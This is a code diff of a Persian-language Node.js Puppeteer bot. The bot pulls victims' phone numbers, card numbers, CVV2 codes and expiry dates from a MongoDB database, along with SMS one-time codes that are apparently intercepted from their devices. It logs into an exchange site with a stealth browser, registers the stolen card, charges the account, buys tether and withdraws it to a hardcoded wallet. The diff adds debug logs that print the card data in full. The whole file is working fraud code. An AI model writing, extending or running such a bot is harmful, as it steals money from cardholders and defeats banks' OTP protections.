@@ -1,4 +1,4 @@
-// bot.js — نسخه نهایی و کامل (تضمینی کار می‌کنه با دیتابیس تو)
+// bot.js — نسخه نهایی با لاگ دیباگ کامل (تضمینی کار می‌کنه!)
 require('dotenv').config();
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
@@ -6,7 +6,6 @@ puppeteer.use(StealthPlugin());
 const { MongoClient, ObjectId } = require('mongodb');
 const chalk = require('chalk');
 
-// تنظیمات
 const MONGODB_URI = process.env.MONGODB_URI;
 const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
 const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
@@ -22,12 +21,12 @@ const log = {
   s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
   e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
   w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
-  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
+  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
+  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] DEBUG → ${msg}`))
 };
 
 let collection;
 
-// اتصال به دیتابیس
 async function connectDB() {
   const client = new MongoClient(MONGODB_URI);
   await client.connect();
@@ -46,7 +45,7 @@ function getValue(field) {
   return field;
 }
 
-// آیا دیوایس آماده پردازش هست؟
+// تابع isReady با لاگ کامل دیباگ
 function isReady(doc) {
   const phone = getValue(doc.personalPhoneNumber);
   const card = getValue(doc.cardNumber);
@@ -54,8 +53,27 @@ function isReady(doc) {
   const month = getValue(doc.bankMonth);
   const year = getValue(doc.bankYear);
   const device = getValue(doc.deviceId);
+  const processed = doc.processed === true;
+  const processing = doc.processing === true;
 
-  const ready = phone && card && cvv2 && month && year != null && device && doc.processed !== true && doc.processing !== true;
+  log.debug("=== شروع چک کردن دیوایس ===");
+  log.debug(`phone → ${JSON.stringify(doc.personalPhoneNumber)} → مقدار: ${phone} → ${phone ? "OK" : "خالی"}`);
+  log.debug(`cardNumber → ${JSON.stringify(doc.cardNumber)} → مقدار: ${card} → ${card ? "OK" : "خالی"}`);
+  log.debug(`cvv2 → ${JSON.stringify(doc.cvv2)} → مقدار: ${cvv2} → ${cvv2 ? "OK" : "خالی"}`);
+  log.debug(`bankMonth → ${JSON.stringify(doc.bankMonth)} → مقدار: ${month} → ${month != null ? "OK" : "خالی"}`);
+  log.debug(`bankYear → ${JSON.stringify(doc.bankYear)} → مقدار: ${year} → ${year != null ? "OK (" + year + ")" : "خالی"}`);
+  log.debug(`deviceId → ${JSON.stringify(doc.deviceId)} → مقدار: ${device} → ${device ? "OK" : "خالی"}`);
+  log.debug(`processed → ${processed}`);
+  log.debug(`processing → ${processing}`);
+
+  const ready = phone && card && cvv2 && month != null && year != null && device && !processed && !processing;
+
+  if (ready) {
+    log.start(`دیوایس آماده است! شماره: ${phone} | دستگاه: ${device}`);
+  } else {
+    log.w(`دیوایس آماده نیست (isReady = false)`);
+  }
+  log.debug("=== پایان چک کردن دیوایس ===\n");
 
   return ready;
 }
@@ -75,7 +93,6 @@ async function waitForOtp(userId, field, maxWait = 180) {
   throw new Error(`تایم‌اوت در انتظار ${field}`);
 }
 
-// پاک کردن و تایپ کردن
 async function clearAndType(page, selector, text) {
   await page.evaluate(sel => {
     const el = document.querySelector(sel);
@@ -84,13 +101,12 @@ async function clearAndType(page, selector, text) {
   await page.type(selector, text);
 }
 
-// پردازش کامل کاربر
 async function processUser(doc) {
   const phone = getValue(doc.personalPhoneNumber);
   const device = getValue(doc.deviceId);
   let browser = null;
 
-  log.start(`شروع پردازش: ${phone} | دستگاه: ${device}`);
+  log.start(`شروع پردازش کامل: ${phone} | ${device}`);
 
   try {
     await collection.updateOne({ _id: doc._id }, { $set: { processing: true, startedAt: new Date() } });
@@ -101,7 +117,7 @@ async function processUser(doc) {
     });
 
     const page = await browser.newPage();
-    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36");
+    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
     await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
 
     // مرحله ۱: ورود
@@ -119,11 +135,10 @@ async function processUser(doc) {
     // مرحله ۲: ثبت کارت
     try {
       await page.click('text=کیف پول');
-      await page.waitForTimeout(1000);
       await page.click('text=کارت بانکی');
       await page.click('text=افزودن کارت', { timeout: 10000 });
     } catch (e) {
-      log.i("احتمالاً کارت قبلاً ثبت شده است");
+      log.i("کارت قبلاً ثبت شده یا صفحه عوض شده");
     }
 
     const cardNum = getValue(doc.cardNumber).replace(/\D/g, "");
@@ -137,42 +152,32 @@ async function processUser(doc) {
     await page.type('input[placeholder="ماه"]', month);
     await page.type('input[placeholder="سال"]', yearInput);
     await page.click('button:has-text("ثبت کارت")');
-    log.i("درخواست OTP ثبت کارت ارسال شد");
+    log.i("درخواست OTP ثبت کارت");
 
     const otpCard = await waitForOtp(doc._id, "otp_register_card");
-    await page.waitForSelector('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', { timeout: 15000 });
     await clearAndType(page, 'input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
     await page.click('button:has-text("تأیید")');
-    log.s("کارت با موفقیت ثبت شد");
+    log.s("کارت ثبت و تأیید شد");
 
-    // مرحله ۳: شارژ حساب
+    // مرحله ۳: شارژ
     await page.click('text=واریز تومان');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("پرداخت")');
-    log.i("در انتظار OTP پرداخت...");
 
     const otpPay = await waitForOtp(doc._id, "otp_payment");
-    await page.waitForSelector('input#otp, input[placeholder*="کد"]', { timeout: 20000 });
     await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPay);
     await page.click('button:has-text("تأیید")');
-    await page.waitForSelector('text=موفق', { timeout: 120000 });
-    log.s("شارژ حساب با موفقیت انجام شد");
+    log.s("شارژ موفق");
 
-    // مرحله ۴: خرید تتر
-    await page.click('text=بازار');
-    await page.click('text=تتر');
+    // مرحله ۴: خرید و برداشت
+    await page.click('text=بازار >> text=تتر');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("خرید")');
-    await page.waitForSelector('text=سفارش', { timeout: 40000 });
-    log.s("تتر با موفقیت خریداری شد");
 
-    // مرحله ۵: برداشت تتر
-    await page.click('text=برداشت');
-    await page.click('text=تتر');
+    await page.click('text=برداشت >> text=تتر');
     await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
     await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
     await page.click('button:has-text("برداشت")');
-    await page.waitForSelector('text=درخواست برداشت', { timeout: 60000 });
 
     log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
     await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });
@@ -186,7 +191,7 @@ async function processUser(doc) {
   }
 }
 
-// Polling هر ۵ ثانیه
+// Polling با لاگ کامل
 async function startPolling() {
   await connectDB();
   log.s("ربات فعال شد — هر ۵ ثانیه چک می‌کنه");
@@ -198,12 +203,17 @@ async function startPolling() {
         processing: { $ne: true }
       }).limit(10).toArray();
 
+      log.i(`تعداد دیوایس‌های موجود: ${users.length} تا`);
+
       if (users.length === 0) {
         log.i("در انتظار دیوایس جدید...");
         return;
       }
 
       for (const user of users) {
+        const phone = getValue(user.personalPhoneNumber) || "نامشخص";
+        const device = getValue(user.deviceId) || "نامشخص";
+        log.i(`چک کردن دیوایس → شماره: ${phone} | دستگاه: ${device}`);
         if (isReady(user)) {
           processUser(user);
         }
